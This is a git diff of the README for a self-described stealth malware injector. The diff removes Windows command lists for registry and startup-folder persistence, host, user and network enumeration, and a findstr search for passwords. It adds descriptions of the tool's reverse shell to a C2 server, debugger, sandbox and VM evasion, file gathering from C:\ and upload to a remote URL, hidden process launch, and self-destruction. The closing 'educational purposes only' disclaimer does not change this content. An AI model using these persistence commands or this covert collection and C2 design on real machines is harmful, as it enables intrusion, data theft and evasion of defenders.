@@ -6,8 +6,9 @@ This program is a stealth malware injector designed to evade analysis, maintain 
 ### Key Features
 - **Stealth Execution**: Runs as a hidden process.
 - **Anti-Analysis**: Checks for debuggers, sandboxes, and virtual machines to avoid detection.
-- **Persistence**: Ensures the malware is executed during system startup.
+- **Persistence**: Ensures the malware is executed during system startup
 - **Reverse Shell**: Establishes a reverse shell connection to a specified C2 server.
+- **Self Destruct**: Deletes itself after a predetermined number of reboots 
 
 ## File Structure
 ```
@@ -63,281 +64,75 @@ g++ -o build/secreto.exe \
 
 ```
 
-## How to Use This Tool
+## About This Tool
 
-### 1. Persistence
-Ensure the malware persists across system reboots by adding it to the registry and startup folder.
+![alt text](shell-1.png)
 
-#### Add to Registry
-```bash
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "malware" /t REG_SZ /d "C:\ProgramData\malware.exe"
+### Persistence
+```Purpose:
+Ensure the tool remains active across system reboots by registering itself in key system areas.
+
+Implementation in Code:
+
+The persistence.h module, along with functions like setupPersistence(), is called during initialization in runStealthTasks().
+The tool may copy its executable to a system location and create registry entries or shortcuts in the startup folder.
 ```
 
-#### Verify Registry Entry
-```bash
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+### Reverse Shell
+```Purpose:
+Allow the attacker to remotely access and control the infected machine.
+
+Implementation in Code:
+
+The ReverseShell.h and its corresponding source file implement the functionality to connect back to a Command and Control (C&C) server.
+In runStealthTasks(), the code calls RunShell(host, port) using specified C&C IP and port values.
+It also handles reconnection through ReconnectToListener(C2Server, C2Port).
 ```
 
-#### Copy Executable to System Location
-```bash
-copy "C:\Users\johns\Downloads\malware.exe" "C:\ProgramData\malware.exe"
+### Analysis Evasion
+```Purpose:
+Avoid detection by security products and sandbox environments through various anti-analysis techniques.
+
+Implementation in Code:
+
+The AnalysisEvasion.h module (and the AntiAnalysis class within) provides several methods:
+Delay Introduction: A pause before executing further actions (e.g., IntroduceDelay(1000)).
+Debugger Detection: Checks if a debugger is attached.
+Virtual Machine Detection: Scans for indicators of virtualized environments.
+Sandbox Evasion: Attempts to bypass common sandbox restrictions.
+Screen Resolution and Process Count Checks: Helps determine if running on a typical end-user system.
 ```
 
-### Add to Startup Folder
-```bash
-copy "C:\Users\shiti\Downloads\malware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"
+### Data Gathering and Exfiltration
+```Purpose:
+Collect sensitive files from the system and exfiltrate them to a remote server.
+
+Implementation in Code:
+
+The gatherer.h/gatherer.cpp and exfiltrator.h/exfiltrator.cpp modules handle file collection and data transmission.
+In main(), after a threshold is met (tracked by a reboot counter), the tool begins gathering files from a specified directory (here, "C:\\") and uploads them to the defined target URL.
+The functionality is wrapped in a try-catch block to handle any errors during the process.
+```
+### Self-Destruction
+```Purpose:
+Erase the malware from the system after completing its tasks or upon reaching a condition (e.g., after exfiltrating data).
+
+Implementation in Code:
+
+The self_destruct.h module contains logic to remove the executable (or possibly other traces) from the system.
+It is called in main() after data exfiltration, ensuring that the malware 
+attempts to erase itself regardless of whether the exfiltration succeeded.
 ```
 
-### 2. System Information
+###  Stealth Process Management
+```Purpose:
+Ensure that only one instance of the stealth process is running and that it operates without alerting the user.
 
-#### General System Info
-```bash
-systeminfo
+Implementation in Code:
+
+The tool checks for an existing instance of its stealth process using a global mutex (Global\\StealthProcessMutex) to prevent multiple instances.
+If the tool is invoked with the "stealth" argument, it runs runStealthTasks() in a separate thread and then enters an infinite sleep to remain active without a visible window.
+The function launchStealthProcess() creates a new process with the CREATE_NO_WINDOW and DETACHED_PROCESS flags to run in the background.
 ```
-
-#### Operating System Version
-```bash
-ver
-```
-
-#### Detailed OS Info
-```bash
-wmic os get Caption, Version, BuildNumber, OSArchitecture
-```
-
-#### BIOS Information
-```bash
-wmic bios get Manufacturer, Version, SerialNumber
-```
-
-#### System Boot Time
-```bash
-wmic os get LastBootUpTime
-```
-
-#### List Environment Variables
-```bash
-set
-```
-
-### 3. User and Group Enumeration
-
-#### List All Users
-```bash
-net user
-```
-
-#### Detailed User Info
-```bash
-net user [username]
-```
-
-#### List All Groups
-```bash
-net localgroup
-```
-
-#### Members of Administrators Group
-```bash
-net localgroup administrators
-```
-
-#### Current Logged-in User
-```bash
-whoami
-```
-
-#### List User Privileges
-```bash
-whoami /priv
-```
-
-#### Domain Info (if domain-joined)
-```bash
-net config workstation
-```
-
-### 4. Network Enumeration
-
-#### IP Configuration
-```bash
-ipconfig /all
-```
-
-#### List Open Ports
-```bash
-netstat -an
-```
-
-#### List Active Connections
-```bash
-netstat -ano
-```
-
-#### ARP Table
-```bash
-arp -a
-```
-
-#### Routing Table
-```bash
-route print
-```
-
-#### Network Shares
-```bash
-net share
-```
-
-#### Mapped Drives
-```bash
-net use
-```
-
-#### DNS Cache
-```bash
-ipconfig /displaydns
-```
-
-#### Firewall Configuration
-```bash
-netsh firewall show state
-```
-
-### 5. Installed Applications and Updates
-
-#### List Installed Programs
-```bash
-wmic product get Name, Version
-```
-
-#### List Installed Hotfixes/Updates
-```bash
-wmic qfe get Description, HotFixID, InstalledOn
-```
-
-#### List Startup Programs
-```bash
-wmic startup get Caption, Command
-```
-
-### 6. Services and Processes
-
-#### List All Services
-```bash
-sc query state= all
-```
-
-#### List Running Processes
-```bash
-tasklist
-```
-
-#### Detailed Process Info
-```bash
-wmic process get Name, ProcessId, CommandLine
-```
-
-#### Check Scheduled Tasks
-```bash
-schtasks /query /fo LIST /v
-```
-
-### 7. File and Directory Enumeration
-
-#### List Files and Directories (Recursive)
-```bash
-dir /s
-```
-
-#### List Hidden Files
-```bash
-dir /a:h
-```
-
-#### Find Files Containing Keywords
-```bash
-findstr /s /i "password" *.*
-```
-
-#### Check File Permissions
-```bash
-icacls [filename]
-```
-
-#### Search for Executable Files
-```bash
-dir *.exe /s /b
-```
-
-### 8. Security Policies and Configuration
-
-#### Local Security Policy Export
-```bash
-secedit /export /cfg C:\security_policy.cfg
-```
-
-#### Group Policy Results
-```bash
-gpresult /v
-```
-
-#### Audit Policy
-```bash
-auditpol /get /category:*
-```
-
-#### Registry Autoruns
-```bash
-reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
-reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-```
-
-### 9. Windows Event Logs
-
-#### System Logs
-```bash
-wevtutil qe System /c:5 /f:text
-```
-
-#### Security Logs
-```bash
-wevtutil qe Security /c:5 /f:text
-```
-
-#### Application Logs
-```bash
-wevtutil qe Application /c:5 /f:text
-```
-
-### 10. Miscellaneous Commands
-
-#### Disk Usage and Free Space
-```bash
-fsutil volume diskfree C:
-```
-
-#### Check System Uptime
-```bash
-net stats srv
-```
-
-#### System Drives Info
-```bash
-wmic logicaldisk get DeviceID, FileSystem, FreeSpace, Size, VolumeName
-```
-
-#### Check for Open Files
-```bash
-openfiles /query
-```
-
-#### View Running Services
-```bash
-tasklist /svc
-```
-
----
-
 ## Notes
 This program is intended for **educational purposes only**. Use it responsibly and ensure you have permission before testing it on any system.
